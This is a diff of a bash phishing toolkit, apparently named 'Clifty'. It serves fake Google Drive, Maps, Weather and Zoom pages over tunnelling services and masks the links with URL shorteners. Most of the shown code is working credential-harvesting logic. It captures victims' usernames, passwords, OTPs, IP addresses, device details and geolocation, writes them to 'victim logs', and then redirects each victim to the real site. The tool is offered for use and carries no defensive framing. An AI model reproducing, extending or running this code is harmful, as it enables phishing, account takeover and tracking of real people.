+echo -e "${CYAN} [3]${MAGENTA} Weather        ${NC}"
+echo -e "${CYAN} [4]${MAGENTA} Zoom Meet      ${NC}"
+echo -e "${CYAN} More sites are coming soon   ${NC}"
+echo -e " "
+echo -e "${CYAN} [X/0]${RED} EXIT ${NC}"
+echo -e " "
+read -p "${prompt}" reply_location
+case $reply_location in
+        1 )
+                site_id="gdrive"
+                dgfname="gdrive"
+                rdurl="www.drive.google.com"
+                site_name="Location"
+                capture_type="LOC"
+                site_template="Google Drive" ;;
+        2 )
+                site_id="nearyou"
+                dgfname="nearyou"
+                rdurl="www.maps.google.com"
+                site_name="Location"
+                capture_type="LOC"
+                site_template="Default" ;;
+        3 )
+                site_id="weather"
+                dgfname="weather"
+                rdurl="www.accuweather.com/"
+                site_name="Location"
+                capture_type="LOC"
+                site_template="Default" ;;
+        4 )
+                site_id="zoom"
+                dgfname="zoom"
+                rdurl="www.zoom.us"
+                site_name="Location"
+                capture_type="LOC"
+                site_template="Zoom" ;;
+	0 | 00 | x | X | exit)
+		msg_exit;;
+        
+	*)
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                 { sleep 1; clear; menu_location; };;
+esac    
+}
+menu_clipboard(){
+status_display
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
+echo -e ""
+echo -e "${CYAN} [1]${MAGENTA} Default        ${NC}"
+echo -e "${CYAN} More sites are coming soon   ${NC}"
+echo -e " "
+echo -e "${CYAN} [X/0]${RED} EXIT ${NC}"
+echo -e " "
+read -p "${prompt}" reply_clipboard
+case $reply_clipboard in
+        1 )
+                site_id="default"
+                dgfname="default"
+                rdurl="www.google.com"
+                site_name="Clipboard"
+                capture_type="CLIP"
+                site_template="Default" ;;
+	0 | 00 | x | X | exit)
+		msg_exit;;
+        
+	*)
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                 { sleep 1; clear; menu_clipboard; };;
+esac    
+}
+menu_ip(){
+status_display
+echo -e " ${ULWHITE}${BOLDWHITE}CHOOSE A PAGE${NF} : ${NC} "
+echo -e ""
+echo -e "${CYAN} [1]${MAGENTA} Default        ${NC}"
+echo -e "${CYAN} More sites are coming soon   ${NC}"
+echo -e " "
+echo -e "${CYAN} [X/0]${RED} EXIT ${NC}"
+echo -e " "
+read -p "${prompt}" reply_ip
+case $reply_ip in
+        1 )
+                site_id="default"
+                dgfname="default"
+                rdurl="www.play.google.com/store/apps/details?id=com.google.android.GoogleCamera"
+                site_name="IP Details"
+                capture_type="IP"
+                site_template="Default" ;;
+	0 | 00 | x | X | exit)
+		msg_exit;;
+        
+	*)
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                 { sleep 1; clear; menu_ip; };;
+esac    
+}
+
+
+## DOWNLOAD SITES
+download_allsite(){
+        { clear; banner; echo -e ""; }
+        status
+	if [ $plainnetstats == "online" ]; then
+               	rm -rf ${sites_dir}
+                echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Downloading Sites..."
+                wget --no-check-certificate https://github.com/Alygnt/phisher-modules/archive/refs/heads/sites.zip > /dev/null 2>&1
+                sleep 1
+                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Unzipping Sites..."
+                unzip -q sites.zip
+                echo -e "\n${BLUE}[${WHITE}-${BLUE}]${GREEN} Setting UP..."
+                mv phisher-modules-sites "${pro_dir}/.sites"
+                rm sites.zip
+                if [ -d "${pro_dir}/.sites" ]; then
+                        echo -e "\n${BLUE}[${WHITE}-${BLUE}]${BOLDGREEN} SITES ARE DOWNLOADED SUCCESSFULLY... ${NA}"
+                        sleep 3
+                        homepage
+                else
+                        echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} UNABLE TO DOWNLOAD THE SITES, Try again later... ${NA}"
+                        sleep 5
+                        homepage
+                fi
+	else
+		echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} YOUR OFFLINE!! CAN'T DOWNLOAD NOW ${NA}"
+		sleep 3
+		homepage
+	fi
+}
+
+#Logs check
+logs_check() {
+	if [ -z "$(ls -A $DIR)" ]; then
+		logs_menu
+	else
+		echo -e "No logs found"
+		{ sleep 1; clear; homepage; }
+	fi
+}
+logs_menu() {
+status_display
+echo -e "${RED}[${WHITE}01${RED}]${YELLOW} View Logs    "
+echo -e "${RED}[${WHITE}02${RED}]${YELLOW} Open Logs   "
+echo -e "${RED}[${WHITE}03${RED}]${YELLOW} Reset Logs  "
+echo -e "${RED}[${WHITE}04${RED}]${YELLOW} Back to Tunnel menu   "
+temprompt="$(echo -e "${GREEN}>> ${ULYELLOW}Clifty/Logs${NF} >>${NA} ${BLUE}")"
+read -p "${temprompt}" reply_logs_menu
+
+        case $reply_logs_menu in
+                1 | 01)
+                        ls ${logs_dir}/
+			{ sleep 8; clear; logs_menu; };;
+                2 | 02)
+			ls ${logs_dir}/
+                        echo -e ""
+                        temprompt="$(echo -e "${RED}[${WHITE}?${RED}]${YELLOW} Enter the file name without extension (.txt) >> ${BLUE}")"
+                        read -p "${temprompt}"
+			if [ -f "${logs_dir}/$REPLY.txt" ]; then
+				cat ${logs_dir}/$REPLY.txt
+			else
+				echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+	                        { sleep 1; clear; logs_menu; }
+			fi;;
+                3 | 03)
+                        echo -e ""
+                        temprompt="$(echo -e "${RED}[${WHITE}?${RED}]${YELLOW} Do you want to clear every victim logs (Y/n) >> ${BLUE}")"
+                        read -p "${temprompt}"
+			case $REPLY in
+        	                Y | y)
+                	                rm -rf ${logs_dir}
+					echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Every logs successfully cleared!! ${NC} "
+					{ sleep 1; clear; tunnel_menu; };;
+                        	N | n | *)
+                                	{ clear;  logs_menu; };;
+
+	                esac;;
+                4 | 04)
+                        { sleep 1; clear; tunnel_menu; };;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; clear; logs_menu; };;
+        esac
 }
 
 load_anim() {
@@ -408,7 +1016,7 @@ check_ngrok(){
 			ngrok_token_check;;
 
 		N | n | *)
-			tunnelmenu;;
+			tunnel_menu;;
 
 		esac
 	else
@@ -496,7 +1104,7 @@ start_ngrok() {
 	*)
 		echo -e " ";;
 	esac
-        #load_print "Launching NGROK" '15'
+#load_print "Launching NGROK" '15'
         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
         if [[ `command -v termux-chroot` ]]; then
                 sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
@@ -530,7 +1138,7 @@ check_cloudflared(){
 			install_cloudflared
 			start_cloudflared;;
 		N | n | *)
-			tunnelmenu;;
+			tunnel_menu;;
 		esac
 	else
                 start_cloudflared
@@ -588,7 +1196,7 @@ check_localxpose(){
 			start_loclx;;
 
 		N | n | *)
-			tunnelmenu;;
+			tunnel_menu;;
 
 		esac
 	else
@@ -619,7 +1227,7 @@ token_localxpose() {
                 temprompt="$(echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE} ENTER YOUR AUTHTOKEN${NA}${YELLOW} >> ${NA}")"
 	        read -p "${temprompt}" loclx_token
 		[[ $loclx_token == "" ]] && {
-			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnelmenu
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
 		} || {
 			echo -n "$loclx_token" > $auth_f 2> /dev/null
 		}
@@ -690,14 +1298,7 @@ start_localhost() {
 #Host and port setup
 HOST='127.0.0.1'
 cusport() {
-        { clear; banner; }
-        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
-        echo -e ""
-        echo -e ""
+        status_display
         PORT=4444
         echo -e "${RED}[${WHITE}?${RED}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO SETUP CUSTOM PORT ${NA}${YELLOW} >> ${BLUE}"
         echo -e "   ${GREEN}Current port : ${BLUE}${PORT}${NA}"   
@@ -705,8 +1306,8 @@ cusport() {
         echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
         echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
         echo -e ""
-        selected="Clifty/${siname}/${sitype}/${tutype}"
-        uprompt;read -p "${prompt}"
+        
+        read -p "${prompt}"
 	case $REPLY in
 	1 | Y | y | yes | Yes | YES)
                 echo -e ""
@@ -722,15 +1323,14 @@ cusport() {
 ## SETUP SITE
 #checking the site is offline or not
 setup_site_check() {
-        { clear; banner; }
-        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
-        echo -e ""
-        if [ -d ${sites_dir} ]; then
-                if [ -d "${sites_dir}/${website}" ]; then
+        status_display
+        final_site_dir="${sites_dir}/${site_access}${site_id}"
+        cp ${fetch_dir}/ip.php ${www_dir}
+	cp ${fetch_dir}/index.php ${www_dir}
+        cp ${fetch_dir}/device.php ${www_dir}
+        cp ${fetch_dir}/device_post.js ${www_dir}
+        if [ -d ${final_site_dir} ]; then
+                if [ -d "${final_site_dir}" ]; then
                         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Site is already downloaded... NOW STARTING!! " 
                         setup_site_downloaded
                 else 
@@ -747,27 +1347,23 @@ setup_site_downloaded() {
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
         sleep 1
         echo -e "\n${RED}[${WHITE}-${RED}]${ULBLUE} SETTING UP SERVER....${NA}"
-        cp -rf ${sites_dir}/"$website"/* ${www_dir}
-	cp ${assets_dir}/ip.php ${www_dir}
-	cp ${assets_dir}/index.php ${www_dir}
+        cp -rf ${final_site_dir}/* ${www_dir}
         cusport
         redirect_check
         start_php
 }
 setup_site_dgf() {
-	rm -rf $dgfname
-        dgfurl="https://github.com/Alygnt/phisher-modules/tree/sites/$dgfname"
-        check_netstats
+	rm -rf ${site_access}
+        dgfurl="https://github.com/Alygnt/phisher-modules/tree/sites/$site_access/$dgfname"
+        status
 	if [ $plainnetstats == "online" ]; then
                 echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Downloading site..."${WHITE}
                 bash ${dgf_dir}/dgf.sh ${dgfurl}
-                if [ -d ${dgfname} ]; then
+                if [ -d ${site_access}/${dgfname} ]; then
                         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Site downloaded Successfully..." 
                         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} SETTING UP" 
-                        cp -rf ${website}/* ${www_dir}
-                        cp ${assets_dir}/ip.php ${www_dir}
-	                cp ${assets_dir}/index.php ${www_dir}
-                        rm -rf ${dgfname}
+                        cp -rf ${site_access}/${site_id}/* ${www_dir}
+                        rm -rf ${site_access}
                         cusport
                         redirect_check
                         start_php
@@ -775,40 +1371,32 @@ setup_site_dgf() {
                         echo -e "\n${RED}[${WHITE}-${RED}]${RED} Unable to download the site!! "
                         echo -e "\n${RED}[${WHITE}-${RED}]${RED} Try again later!!"
                         sleep 5
-                        mainmenu
+                        homepage
                 fi
 	else
 		echo -e "\n${BLUE}[${RED}!${BLUE}]${BOLDRED} Your offline can't download the site!!${NA}"
 		echo -e "\n${RED}[${WHITE}-${RED}]${RED} Try again later!!"
                 sleep 5
-                mainmenu
+                homepage
 	fi
 }
 start_php() {
-         { clear; banner; echo -e ""; }
+        { clear; banner; echo -e ""; }
         echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server...${NC}"
         cd ${www_dir} && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
 ##REDIRECT
 redirect_check(){
-        { clear; banner; }
-        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
-        echo -e ""
-        echo -e ""
+        status_display
         echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO CHANGE REDIRECT URL ${NF} : ${NC}"
         echo -e "   ${GREEN}Current Redirect Url : ${BLUE}${rdurl}${NA}"   
         echo -e " "
         echo -e "${BLUE}[1/Y]  ${CYAN} YES ${NC}"
         echo -e "${BLUE}[2/N/*]${CYAN} NO ${NC}"
         echo -e ""
-        selected="Clifty/${siname}/${sitype}/${tutype}"
-        uprompt;read -p "${prompt}" rdchoice
+        
+        read -p "${prompt}" rdchoice
 		case $rdchoice in
                 1 | Y | y | yes | Yes | YES)
   	                redirect_input;;
@@ -824,25 +1412,24 @@ redirect_input() {
         if [[ "${urdurl//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
 		echo -e "${RED}[${WHITE}!${RED}]${RED} Don't type http or https in the URL"
                 sleep 3
-                { clear; banner; }
-                echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-                echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-                echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-                echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
-                echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
-                echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
-                echo -e ""
+                status_display
                 redirect_input
         else
                 redirect_setup
 	fi
 }
 redirect_setup() {
-	if [ -f ${www_dir}/NOTP ];then
-                sed -i "s/redirecturl/${urdurl}/g" "${www_dir}/process.php"
+        rm -rf rdurl.php
+        rm -rf "${www_dir}/rdurl.php"
+	if [ ${capture_type}="NOTP" ];then
+                awk "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/process.php" > rdurl.php
+                rm -rf "${www_dir}/process.php"
+                mv rdurl.php "${www_dir}/process.php"
                 rdurl=${urdurl}
-        elif [[ -f ${www_dir}/OOTP || -f ${www_dir}/POTP ]];then
-                sed -i "s/redirecturl/${urdurl}/g" "${www_dir}/otp.php"
+        elif [[ ${capture_type}="OOTP" || ${capture_type}="POTP" ]];then
+                awk  "{gsub(\"redirecturl\",\"https://${urdurl}\"); print}" "${www_dir}/otp.php" > rdurl.php
+                rm -rf "${www_dir}/otp.php"
+                mv rdurl.php "${www_dir}/otp.php"
                 rdurl=${urdurl}
 	else
 		echo -e "${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up custom redirect URL!!"
@@ -853,10 +1440,16 @@ redirect_setup() {
         fi
 }
 redirect_default() {
-	if [ -f ${www_dir}/NOTP ];then
-                sed -i "s/redirecturl/${rdurl}/g" "${www_dir}/process.php"
-        elif [[ -f ${www_dir}/OOTP || -f ${www_dir}/POTP ]];then
-                sed -i "s/redirecturl/${rdurl}/" "${www_dir}/otp.php"
+        rm -rf rdurl.php
+        rm -rf "${www_dir}/rdurl.php"
+	if [ ${capture_type}="NOTP" ];then
+                awk "{gsub(\"redirecturl\",\"https://${rdurl}\"); print}" "${www_dir}/process.php" > rdurl.php
+                rm -rf "${www_dir}/process.php"
+                mv rdurl.php "${www_dir}/process.php"
+        elif [[ ${capture_type}="OOTP" || ${capture_type}="POTP" ]];then
+                awk  "{gsub(\"redirecturl\",\"https://${rdurl}\"); print}" "${www_dir}/otp.php" > rdurl.php
+                rm -rf "${www_dir}/otp.php"
+                mv rdurl.php "${www_dir}/otp.php"
 	else
 		echo -e " ${RED}[${WHITE}!${RED}]${RED} Error Occured in setting up redirect URL!!"
                 sleep 5
@@ -873,6 +1466,8 @@ checklink() {
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error in generating the link"
 		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting localhost. You might need to start tunneler manually"
 		sleep 5
+		tunnel_name="LocalHost"
+                tunnel_id="localhost"
 		start_localhost
 	else
 		cusurl
@@ -881,16 +1476,7 @@ checklink() {
 
 ## URL MASKING
 cusurl(){
-	{ clear; banner; echo -e " "; }
-        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}REDIRECT${NA} : ${ULMAGENTA}${BOLDMAGENTA}${rdurl}${NA}"
-        echo -e ""
-        echo -e ""
+	status_display
         echo -e "${GREEN}[${WHITE}?${GREEN}]${ULWHITE}${BOLDWHITE}DO YOU WANT TO CUSTOMIZE THE URL BELOW ${NF} : ${NA}"
         echo -e "   ${GREEN}URL : ${BLUE}${LINK}${NA}"  
         echo -e "" 
@@ -901,7 +1487,7 @@ cusurl(){
 	read -p "${temprompt}" CUS_URI
 	case $CUS_URI in
                 Y | y)
-			check_netstats
+			status
 			if [ $netstats == "online" ]; then
 				shorten_keystocks
 			else
@@ -1007,16 +1593,9 @@ shorten_tinyurl() {
 
 ## Display link
 displaylocalhost(){
-        { clear; sbanner; echo -e ""; }
-        echo -e "\t\t${GREEN})) ${BLUE}Your IP address = $myip${NA}"
-        echo -e "\t\t${GREEN})) ${BLUE}Network Status  = $netstats${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}SITE${NA}     : ${ULMAGENTA}${BOLDMAGENTA}${siname}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}TEMPLATE${NA} : ${ULMAGENTA}${BOLDMAGENTA}${sitype}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}TUNNELER${NA} : ${ULMAGENTA}${BOLDMAGENTA}${tutype}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}PORT    ${NA} : ${ULMAGENTA}${BOLDMAGENTA}${PORT}${NA}"
-        echo -e "\t\t${GREEN})) ${ULBLUE}REDIRECT${NA} : ${ULMAGENTA}${BOLDMAGENTA}${rdurl}${NA}"
-        echo -e ""
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} LOCALHOST URL : ${GREEN}http://${HOST}:${PORT}"
+        status_display
+        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} LOGS NAME : ${WHITE}${pro_dir}/logs/${log_dir_name}/${log_name}${NA}"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} LOCALHOST URL : ${GREEN}http://${HOST}:${PORT} ${NA}"        
 }
 displaylink(){
 	displaylocalhost
@@ -1039,14 +1618,19 @@ displayshortlink() {
 
 #Capture data check
 capture_data_check(){
-	if [ -f ${www_dir}/NOTP ];then
+        final_logs_dir="${pro_dir}/logs/${log_dir_name}"
+	final_logs_name="${final_logs_dir}/logs.txt"
+        echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit..."
+        mkdir ${final_logs_dir}
+        touch ${final_logs_name}
+	if [ ${capture_type}="NOTP" ];then
                 capture_data_notp
-        elif [ -f ${www_dir}/OOTP ];then
+        elif [ ${capture_type}="OOTP" ];then
                 capture_data_ootp
-        elif [ -f ${www_dir}/POTP ];then
+        elif [ ${capture_type}="POTP" ];then
                 capture_data_potp
 	else
-		echo -e " Error Occured!!"
+		echo -e " Error Occured in capturing data!!"
         fi
 # NOTP - id pass
 # OOTP - id otp
@@ -1054,16 +1638,13 @@ capture_data_check(){
 }
 
 ## Print data no otp
-capture_data_notp() {
-        echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit..."
+capture_data_notp() {  
 	while true; do
                 if [[ -e "${www_dir}/ip.txt" ]]; then
-                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                         capture_ip
                 fi
                 sleep 0.75
                 if [[ -e "${www_dir}/usernames.txt" ]]; then
-                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !"
                         capture_id
 			capture_pass
 			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
@@ -1074,21 +1655,17 @@ capture_data_notp() {
 
 ## Print data otp
 capture_data_ootp() {
-        echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit..."
 	while true; do
                 if [[ -e "${www_dir}/ip.txt" ]]; then
-                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                         capture_ip
                 fi
                 sleep 0.75
                 if [[ -e "${www_dir}/usernames.txt" ]]; then
-                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
                         capture_id
 			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for OTP > "
 			echo -ne "\n${ITALICWHITE} NOTE : OTP will only be sent to victim when you login to offical website ${NA}"
                 fi
 		if [[ -e "${www_dir}/otp.txt" ]]; then
-			echo -ne "\n\n${GREEN} OTP Found !"
                         capture_otp
 			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
                 fi
@@ -1098,22 +1675,18 @@ capture_data_ootp() {
 
 ## Print data notp & otp
 capture_data_potp() {
-        echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit..."
 	while true; do
                 if [[ -e "${www_dir}/ip.txt" ]]; then
-                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                         capture_ip
                 fi
                 sleep 0.75
                 if [[ -e "${www_dir}/usernames.txt" ]]; then
-                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!!"
                         capture_id
 			capture_pass
 			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for OTP >"
                        echo -ne "\n${ITALICWHITE} NOTE : OTP will only be sent to victim when you login to offical website ${NA}"
                 fi
 		if [[ -e "${www_dir}/otp.txt" ]]; then
-			echo -ne "\n\n${GREEN} OTP Found !"
 			capture_otp
 			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
 		fi
@@ -1126,95 +1699,100 @@ capture_ip() {
 	IP=$(grep -a 'IP:' ${www_dir}/ip.txt | cut -d " " -f2 | tr -d '\r')
 ##	IP=$(awk -F 'IP: ' '{print $2}' ${www_dir}/ip.txt | xargs)
 	victim_ip=${IP}
-	echo -e "${YELLOW}>>>${MAGENTABG} ${BOLDWHITE} VICTIM IP : ${victim_ip}${RESETBG}${NA}"
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM IP : ${BOLDWHITE}${victim_ip}${NA}"
 	if [[ $reply_tunnel -eq 1 || $reply_tunnel -eq 01 ]]; then
 		echo -ne "${RED} IP details cannot be captured in localhost server"
-		echo -e " "
-		save_ip
 	else
 		ip_details $IP
-		save_ip
 	fi
-}
-save_ip() {
-	cat ${dumps_dir}/space.txt >> ${log_name}.txt
-	cat ${dumps_dir}/line.txt >> ${log_name}.txt
-	cat ${www_dir}/ip.txt >> ${log_name}.txt
-	cat ${dumps_dir}/space.txt >> ${log_name}.txt
-        cat ${dumps_dir}/line.txt >> ${log_name}.txt
-	cat ${dumps_dir}/space.txt >> ${log_name}.txt
-	mv ${log_name}.txt ${logs_dir}
+        cat ${dumps_dir}/space.txt >> ${final_logs_name}
+	cat ${dumps_dir}/line.txt >> ${final_logs_name}
+	cat ${www_dir}/ip.txt >> ${final_logs_name}
+	cat ${dumps_dir}/space.txt >> ${final_logs_name}
+        cat ${dumps_dir}/line.txt >> ${final_logs_name}
+	cat ${dumps_dir}/space.txt >> ${final_logs_name}
 	echo -ne " "
-	echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} /logs/${log_name}.txt"
+	echo -ne "\n${BLUE}Saved IP address in Logs"
 	rm -rf ${www_dir}/ip.txt
+        if [ -f "${www_dir}/device.txt" ]; then
+                echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} VICTIM DEVICE DETAILS : ${RESETBG} ${BOLDWHITE}"
+                cat ${www_dir}/device.txt 
+                echo -e "${NA}"
+		cat ${dumps_dir}/space.txt >> ${final_logs_name}
+                cat ${dumps_dir}/line.txt >> ${final_logs_name}
+                cat ${dumps_dir}/space.txt >> ${final_logs_name}
+                cat ${www_dir}/device.txt >> "${final_logs_name}"
+                echo -ne "\n${BLUE}Saved device details in Logs"
+	fi
+
 }
 ip_details() {
-	echo -e " " 
-	echo -e "${RED}[${WHITE}-${RED}]${GREEN} Trying to capture details of IP : ${BLUE}${IP} "
+	echo -e "\n\n${RED}[${WHITE}-${RED}]${MAGENTABG} ${ULWHITE} Trying to capture details of IP : ${RESETBG} ${IP}${NA}"
 ##	curl -s -L "http://ipwhois.app/json/$IP" -o rawtrack.txt
 	wget --no-check-certificate "http://ipwhois.app/json/${IP}" -O rawtrack.txt > /dev/null 2>&1
 	sleep 2
 	grep -o '"[^"]*"\s*:\s*[^,]*' rawtrack.txt > track.txt
 	iptt=$(sed -n 's/"ip"://p' track.txt)
 	if [[ $iptt != "" ]]; then
-		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
+		echo -e  "\n${GREEN} Device ip: ${BOLDWHITE} $iptt"
 	fi
 	ipstats=$(sed -n 's/"success"://p' track.txt)
 	if [[ $ipsuccess != "" ]]; then
-                echo -e  "\n${GREEN} IP details capturing: ${NC} $iptt"
+                echo -e  "\n${GREEN} IP details capturing: ${BOLDWHITE} $iptt"
         fi
 	iptype=$(sed -n 's/"type"://p' track.txt)
 	if [[ $iptype != "" ]]; then
-		echo -e "${GREEN} IP type: ${NC} $iptype"
+		echo -e "${GREEN} IP type: ${BOLDWHITE} $iptype"
 	fi
 	latitude=$(sed -n 's/"latitude"://p' track.txt)
 	if [[ $latitude != "" ]]; then
-		echo -e  "${GREEN} Latitude:  ${NC} $latitude"
+		echo -e  "${GREEN} Latitude:  ${BOLDWHITE} $latitude"
 	fi
 	longitude=$(sed -n 's/"longitude"://p' track.txt)
 	if [[ $longitude != "" ]]; then
-		echo -e  "${GREEN} Longitude:  ${NC} $longitude"
+		echo -e  "${GREEN} Longitude:  ${BOLDWHITE} $longitude"
 	fi
 	city=$(sed -n 's/"city"://p' track.txt)
 	if [[ $city != "" ]]; then
-		echo -e "${GREEN} City: ${NC} $city"
+		echo -e "${GREEN} City: ${BOLDWHITE} $city"
 	fi
 	isp=$(sed -n 's/"isp"://p' track.txt)
 	if [[ $isp != "" ]]; then
-		echo -e "${GREEN} Isp: ${NC} $isp"
+		echo -e "${GREEN} Isp: ${BOLDWHITE} $isp"
 	fi
 	country=$(sed -n 's/"country"://p' track.txt)
 	if [[ $country != "" ]]; then
-		echo -e  "${GREEN} Country: ${NC} $country"
+		echo -e  "${GREEN} Country: ${BOLDWHITE} $country"
 	fi
 	flag=$(sed -n 's/"country_flag"://p' track.txt)
 	if [[ $flag != "" ]]; then
-		echo -e "${GREEN} Country flag: ${NC} $flag"
+		echo -e "${GREEN} Country flag: ${BOLDWHITE} $flag"
 	fi
